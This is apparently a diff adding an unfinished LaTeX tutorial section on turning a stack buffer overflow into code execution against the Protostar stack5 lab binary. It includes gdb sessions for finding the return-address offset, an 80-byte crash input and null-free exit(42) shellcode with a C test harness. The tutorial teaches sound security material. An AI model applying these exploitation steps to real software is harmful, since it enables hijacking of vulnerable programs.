@@ -1,0 +1,308 @@
+\subsection{Code Execution}
+
+To really have impact in exploiting a stack-based buffer overflow, we want to escalate our
+memory overwrite into code execution. This way we can trick a vulnerable program into
+doing our bidding, potentially using its greater privileges to do something we normally cannot.
+To do this with a stack-based buffer overflow, we would need a situation where a memory overwrite, 
+starting at some location on the stack and of potentially arbitrary length, can change execution
+flow in a beneficial way. This leaves us the option of either exploiting the specific situation
+at hand, such as overwriting a function pointer the programmer is using, or exploiting the general
+situation of the stack itself. Luckily for us, the stack is crucial in implementing the \texttt{call}
+instruction, which itself is crucial in implementing function calls, giving us exactly what we need.
+
+The precise behavior of the \texttt{call} instruction or its importance in function calls won't be detailed
+here, as it's assumed the reader is already familiar with this. It will suffice to say that the \texttt{\$eip}
+register is stored on the stack when entering the function, and retreived later to return execution
+flow to the correct point. The basic situation is that any stack-based buffer will have this stored return
+address after it in memory, allowing an attacker to overwrite it during a buffer overflow. To see precisely
+how this is done, we'll explore another example. The target is very simple, so for extra challenge
+we will only use the compiled binary as a reference, doing some light reverse-engineering.
+
+\begin{lstlisting}
+user@protostar:~/stack/5$ objdump -d /opt/protostar/bin/stack5
+...
+080483c4 <main>:
+ 80483c4:       55                      push   %ebp
+ 80483c5:       89 e5                   mov    %esp,%ebp
+ 80483c7:       83 e4 f0                and    $0xfffffff0,%esp
+ 80483ca:       83 ec 50                sub    $0x50,%esp
+ 80483cd:       8d 44 24 10             lea    0x10(%esp),%eax
+ 80483d1:       89 04 24                mov    %eax,(%esp)
+ 80483d4:       e8 0f ff ff ff          call   80482e8 <gets@plt>
+ 80483d9:       c9                      leave  
+ 80483da:       c3                      ret    
+ 80483db:       90                      nop
+ 80483dc:       90                      nop
+...
+\end{lstlisting}
+
+Here we see that our \texttt{main} function is very simple. Lines 4-7 are the standard function prelude, along
+with stack alignment to a 16-byte boundary, and allocation of a few bytes for a buffer. With lines 8 and 9
+we see the address of a buffer being put on the stack for the subsequent call to \texttt{gets} on line 10. After this,
+we simply return from main, beginning the journey back through libc code to the ultimate end of the program.
+
+Since we already know \texttt{gets} is vulnerable to buffer overflows, let's focus our attention on line 10.
+At that point in execution, the value of \texttt{\$esp+0x10} is on the stack as the argument to \texttt{gets}.
+From lines 6 and 7, we know that there is anywhere from \texttt{0x40+0x4} to \texttt{0x40+0x4+0xf} bytes
+from this location (the beginning of our target buffer) until the stored return address. Just for sanity, 
+let's verify the situation with gdb.
+
+\begin{lstlisting}
+user@protostar:~/stack/5/documentation$ gdb -q /opt/protostar/bin/stack5
+Reading symbols from /opt/protostar/bin/stack5...done.
+(gdb) disas main
+Dump of assembler code for function main:
+0x080483c4 <main+0>:    push   %ebp
+0x080483c5 <main+1>:    mov    %esp,%ebp
+0x080483c7 <main+3>:    and    $0xfffffff0,%esp
+0x080483ca <main+6>:    sub    $0x50,%esp
+0x080483cd <main+9>:    lea    0x10(%esp),%eax
+0x080483d1 <main+13>:   mov    %eax,(%esp)
+0x080483d4 <main+16>:   call   0x80482e8 <gets@plt>
+0x080483d9 <main+21>:   leave  
+0x080483da <main+22>:   ret    
+End of assembler dump.
+(gdb) b *(main+16)
+Breakpoint 1 at 0x80483d4: file stack5/stack5.c, line 10.
+(gdb) r
+Starting program: /opt/protostar/bin/stack5 
+
+Breakpoint 1, 0x080483d4 in main (argc=1, argv=0xbffff874) at stack5/stack5.c:10
+10      stack5/stack5.c: No such file or directory.
+        in stack5/stack5.c
+(gdb) x/x $esp
+0xbffff770:     0xbffff780
+(gdb) x/24x 0xbffff780
+0xbffff780:     0xb7fd7ff4      0x0804958c      0xbffff798      0x080482c4
+0xbffff790:     0xb7ff1040      0x0804958c      0xbffff7c8      0x08048409
+0xbffff7a0:     0xb7fd8304      0xb7fd7ff4      0x080483f0      0xbffff7c8
+0xbffff7b0:     0xb7ec6365      0xb7ff1040      0x080483fb      0xb7fd7ff4
+0xbffff7c0:     0x080483f0      0x00000000      0xbffff848      0xb7eadc76
+0xbffff7d0:     0x00000001      0xbffff874      0xbffff87c      0xb7fe1848
+(gdb) x/x 0xbffff874
+0xbffff874:     0xbffff980
+(gdb) x/s 0xbffff980
+0xbffff980:      "/opt/protostar/bin/stack5"
+(gdb) x/5i 0xb7eadc76
+0xb7eadc76 <__libc_start_main+230>:     mov    %eax,(%esp)
+0xb7eadc79 <__libc_start_main+233>:     call   0xb7ec60c0 <*__GI_exit>
+0xb7eadc7e <__libc_start_main+238>:     xor    %ecx,%ecx
+0xb7eadc80 <__libc_start_main+240>:     jmp    0xb7eadbc0 <__libc_start_main+48>
+0xb7eadc85 <__libc_start_main+245>:     mov    0x37d4(%ebx),%eax
+(gdb) disas __libc_start_main
+Dump of assembler code for function __libc_start_main:
+...
+0xb7eadc6f <__libc_start_main+223>:     mov    %eax,0x4(%esp)
+0xb7eadc73 <__libc_start_main+227>:     call   *0x8(%ebp)
+0xb7eadc76 <__libc_start_main+230>:     mov    %eax,(%esp)
+0xb7eadc79 <__libc_start_main+233>:     call   0xb7ec60c0 <*__GI_exit>
+...
+\end{lstlisting}
+
+It's assumed that the reader is familiar enough with gdb that only the bits relevant to our overflow
+will need explaining. Once we set our breakpoint and stop execution on it, we examine the stack.
+Since \texttt{gets} takes an argument of type \texttt{char *}, on line 23 we examine our buffer, 
+plus some of what's after it. Note that in disassembling our target, we don't yet know precisely
+how large the buffer is designed to be, but we can certainly place bounds on it. For example,
+we know it must be at least \texttt{0x40} bytes, but its limit is also determined by the
+location of parameters to \texttt{main} on the stack. So, certainly everything 
+from \texttt{0xbffff780} to \texttt{0xbffff7bf} is valid memory for the local buffer. Note that
+the memory appears used and of importance because C does not initialize memory when it is allocated,
+so we have some garbage values on the stack to ignore.
+
+Returning to the issue at hand, we want to try and precisely pin down how far from the beginning of our
+buffer the stored \texttt{\$eip} is. The quick and dirty method would have us already entering
+buffers of different length into the program and examining the crash to determine what length
+we want, but we can do better than that. Remembering that the arguments to \texttt{main}
+are \texttt{int argc, char **argv, char **envp}, we can easily find our target. Given the
+way we executed the program, we know that \texttt{argc} is 1, and \texttt{argv} points to a
+\texttt{char *} which is pointing to the string "/opt/protostar/bin/stack5". In fact, the
+\texttt{0x00000001} at \texttt{0xbffff7d0} is a dead-ringer for \texttt{argc}, so on lines
+32 and 34 we verify that we indeed have the expected \texttt{char **argv} at \texttt{0xbffff7d4}.
+This is indeed the case, so we now know that arguments to \texttt{main} are at \texttt{0xbffff7d0},
+meaning that our target return pointer is located at \texttt{0xbffff7cc}. In fact, at line 36
+we examine that section of memory (\texttt{0xb7eadc76}) for instructions, and finding that it's located
+in \texttt{\_\_libc\_start\_main}, disassemble it a bit further to verify that it is preceded by a 
+\texttt{call} instruction at \texttt{0xb7eadc73}. Seeing this, we can confidently say that
+our vulnerable buffer begins at \texttt{0xbffff780} and our ultimate target is at \texttt{0xbffff7cc},
+so we want a buffer with a length of \texttt{0x50} (80) bytes.
+
+For those not masochistic enough to prefer the gdb output, following is a diagram of the stack upon hitting
+our breakpoint.
+
+TODO: add diagram
+
+So, we've established that with a buffer of 80 bytes, we can take advantage of the buffer overflow
+to overwrite a value which will ultimately let us decided where the processor will load and
+execute instructions from. Let's quickly test this, using gdb and some perl trickery.
+
+\begin{lstlisting}
+user@protostar:~/stack/5$ perl -e 'print "A"x80' > crashme
+user@protostar:~/stack/5$ gdb -q /opt/protostar/bin/stack5
+Reading symbols from /opt/protostar/bin/stack5...done.
+(gdb) r < crashme
+Starting program: /opt/protostar/bin/stack5 < crashme
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+\end{lstlisting}
+Here, we create an 80-character byte string of ``A", and store that in a file. Because this is ASCII,
+``A" = \texttt{0x41}, meaning that ``crashme" is now a file with 80 \texttt{0x41} bytes repeating. This
+not only fulfills length requirements to overflow into our target, but also gives us a value to
+watch for; \texttt{0x41414141}. In fact, when debugging the program under gdb, we notice that
+we segfault when the processor tries to load/execute an instruction from \texttt{0x41414141}, confirming
+that we are indeed overwriting our target and redirecting execution flow!
+
+\subsubsection{Leveraging Execution Redirection}
+So, we can redirect execution arbitrarily, but what good does that do us? Certainly, we're limited only to
+whatever other functions and code our target has loaded into memory, right? Well, the answer is a little
+more complicated than that, and without modern protections, certainly easier. For example, older
+programs usually have an executable stack, allowing us to overflow our buffer with code that we will
+then execute. As a simple proof of concept, we will exploit the vulnerable program \texttt{stack5}
+using a simple payload to change the program's exit value to 42. An easy way to get working machine
+code is simply to write a C program doing what you want, compiling, then disassembling it.
+
+\lstinputlisting[language=C]{exit.c}
+
+Very simple. We just call the standard library function \texttt{exit()}, passing a parameter of 42.
+To get to the heart of this and implement it for our shellcode, we have to briefly mention
+some things regarding glibc and linux. With glibc, \texttt{exit()} doesn't just exit the program.
+It will close open handles, and run any functions registered with \texttt{on\_exit()}. Ultimately,
+it's the \texttt{\_exit()} function that will end our program, using the standard linux syscall
+facility to call the \texttt{sys\_exit} function within the kernel. As this involves setting
+registers before issuing an interrupt via \texttt{int \$0x80}, we'll want to look for this instruction.
+
+Secondly, gcc will compile programs for dynamic linking by default. This means we can't
+simply disassemble our binary and find the ia32 instructions for \texttt{\_exit}, but
+instead we have to debug it live, waiting for the linker to place the glibc library in
+our process' memory space. Alternatively, we could compile with the \texttt{-static}
+option to statically link glibc into our binary, but either way we'll get the same result.
+
+\begin{lstlisting}
+user@protostar:~/shellcode/exit$ gcc -o exit_c exit.c
+user@protostar:~/shellcode/exit$ gdb -q ./exit_c
+Reading symbols from /home/user/shellcode/exit/exit_c...(no debugging symbols found)...done.
+(gdb) disas main
+Dump of assembler code for function main:
+0x080483c4 <main+0>:    push   %ebp
+0x080483c5 <main+1>:    mov    %esp,%ebp
+0x080483c7 <main+3>:    and    $0xfffffff0,%esp
+0x080483ca <main+6>:    sub    $0x10,%esp
+0x080483cd <main+9>:    movl   $0x2a,(%esp)
+0x080483d4 <main+16>:   call   0x80482f8 <exit@plt>
+End of assembler dump.
+(gdb) b *(main+16)
+Breakpoint 1 at 0x80483d4
+(gdb) r
+Starting program: /home/user/shellcode/exit/exit_c 
+
+Breakpoint 1, 0x080483d4 in main ()
+(gdb) disas _exit
+Dump of assembler code for function _exit:
+0xb7f2e154 <_exit+0>:   mov    0x4(%esp),%ebx
+0xb7f2e158 <_exit+4>:   mov    $0xfc,%eax
+0xb7f2e15d <_exit+9>:   int    $0x80
+0xb7f2e15f <_exit+11>:  mov    $0x1,%eax
+0xb7f2e164 <_exit+16>:  int    $0x80
+0xb7f2e166 <_exit+18>:  hlt    
+End of assembler dump.
+\end{lstlisting}
+
+Alright, so now we can closely examine how exactly our program exits using \texttt{\_exit}. First, it loads its
+parameter into \texttt{\$ebx}, then it loads \texttt{0xfc} into \texttt{\$eax}, following it with an \texttt{int \$0x80}
+instruction. This basically calls the \texttt{sys\_exit\_group} function from the kernel, with the exit
+code as whatever value is in \texttt{\$ebx}. After this, it calls \texttt{sys\_exit} with the same parameter,
+then halts, because after this, the program should no longer be executing. Using this, we can craft our
+own program to exit with a value of 42.
+
+\begin{lstlisting}
+.section .text
+.globl _start
+_start:
+        xorl %eax,%eax
+        xorl %ebx,%ebx
+        movb $42,%bl
+        movb $1,%al
+        int $0x80
+\end{lstlisting}
+
+This program not only calls the \texttt{sys\_exit} syscall with a value of 42, but also is designed
+specifically to avoid producing null bytes when assembled. This is so that during exploitation,
+our shellcode is entirely accepted by \texttt{gets}, as opposed to truncated at the first null byte.
+Let's assemble this and take a look.
+
+\begin{lstlisting}
+user@protostar:~/shellcode/exit$ as -o exit.o exit.asm
+user@protostar:~/shellcode/exit$ ld -o exit_asm exit.o
+user@protostar:~/shellcode/exit$ objdump -d exit_asm
+...
+08048054 <_start>:
+ 8048054:       31 c0                   xor    %eax,%eax
+ 8048056:       31 db                   xor    %ebx,%ebx
+ 8048058:       b3 2a                   mov    $0x2a,%bl
+ 804805a:       b0 01                   mov    $0x1,%al
+ 804805c:       cd 80                   int    $0x80
+user@protostar:~/shellcode/exit$ ./exit_asm
+user@protostar:~/shellcode/exit$ echo $?
+42
+\end{lstlisting}
+
+Here, we assemble and link our exit.asm file, then use objdump to verify that we have not produced any
+null bytes (we haven't). Next, we run our program and verify it does exit with a value of 42 (it does).
+Now that we've done this, we're basically ready to build some very simple shellcode that will 
+essentially \texttt{\_exit(42)} when executed in the target process. As the only important piece of information
+at this step is the specific sequence of bytes which make up our \texttt{\_exit(42)} shellcode,
+let's do one final test with it, executing it in an environment similar to our target.
+
+\begin{lstlisting}
+//injectable version (no nulls)
+char injectable[] = "\x31\xc0" // xorl %eax,%eax
+                "\x31\xdb" // xorl %ebx,%ebx
+                "\xb3\x2a" //movb $42,%bl
+                "\xb0\x01" //movb $1,%al
+                "\xcd\x80"; //int $0x80
+void launchpad(long placeholder)
+{
+        long *eip = &placeholder;
+        eip--;
+        *eip = (long)&injectable;
+}
+
+int main()
+{
+        launchpad(0xf0f0f0f0);
+}
+\end{lstlisting}
+
+Here, our launchpad function takes advantage of the standard calling convention to overwrite its own
+return pointer with the address of our shellcode, simulating an execution redirection in
+a normal exploitation. Debugging this program lets us watch the return value get clobbered, as
+well as test that our shellcode functions as it should.
+
+\begin{lstlisting}
+user@protostar:~/shellcode/exit$ gdb -q ./shellcode
+Reading symbols from /home/user/shellcode/exit/shellcode...(no debugging symbols found)...done.
+(gdb) b *launchpad
+Breakpoint 1 at 0x8048394
+(gdb) r
+Starting program: /home/user/shellcode/exit/shellcode 
+
+Breakpoint 1, 0x08048394 in launchpad ()
+(gdb) disas launchpad
+Dump of assembler code for function launchpad:
+0x08048394 <launchpad+0>:       push   %ebp
+0x08048395 <launchpad+1>:       mov    %esp,%ebp
+0x08048397 <launchpad+3>:       sub    $0x10,%esp
+0x0804839a <launchpad+6>:       lea    0x8(%ebp),%eax
+0x0804839d <launchpad+9>:       mov    %eax,-0x4(%ebp)
+0x080483a0 <launchpad+12>:      subl   $0x4,-0x4(%ebp)
+0x080483a4 <launchpad+16>:      mov    $0x8049598,%edx
+0x080483a9 <launchpad+21>:      mov    -0x4(%ebp),%eax
+0x080483ac <launchpad+24>:      mov    %edx,(%eax)
+0x080483ae <launchpad+26>:      leave  
+0x080483af <launchpad+27>:      ret    
+End of assembler dump.
+
+\end{lstlisting}
+
+TODO: finish discussing achieving code execution, with example\\
